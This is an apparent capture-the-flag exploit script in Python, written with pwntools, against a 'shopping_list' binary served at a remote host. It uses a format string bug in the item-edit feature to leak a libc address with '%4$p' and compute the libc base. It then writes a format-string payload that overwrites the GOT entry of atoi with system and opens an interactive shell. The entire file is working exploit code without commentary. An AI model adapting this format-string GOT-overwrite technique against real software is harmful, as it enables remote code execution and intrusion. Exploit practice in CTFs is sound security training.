from pwn import *
from libformatstr import FormatStr

libc = ELF('./libc-2.23.so')
context.terminal = ['tmux', 'splitw', '-h']
context.binary = elf = ELF('./shopping_list')
# p = process('./shopping_list')
# gdb.attach(p, '''
#     init-peda
# ''')
p = remote("jh2i.com", 50002)
def add(val):
    p.sendlineafter("> ", '1')
    p.sendlineafter("add? ", val)


def edit(idx, val):
    p.sendlineafter("> ", '3')
    p.sendlineafter("item? ", str(idx))
    p.sendlineafter("new value? ", val)


add('asdf')
edit(1,"%4$p")
p.recvuntil("Value: ")
leak = int(p.recvline(False),16)
print hex(leak)
libc_base = leak-0x5e6700
log.info("Libc : 0x{:x}".format(libc_base))
f = FormatStr(isx64=1)
system = libc.symbols['system'] + libc_base
f[elf.got['atoi']] = system & 0xffffffff
f[elf.got['atoi']+4] = system >> 32
payload = f.payload(74)

# p.recvuntil("A"*8)
# print p.recvline().split('|').index("0x"+"41"*8)
edit(1, payload)
p.recvuntil("> ")
p.interactive()
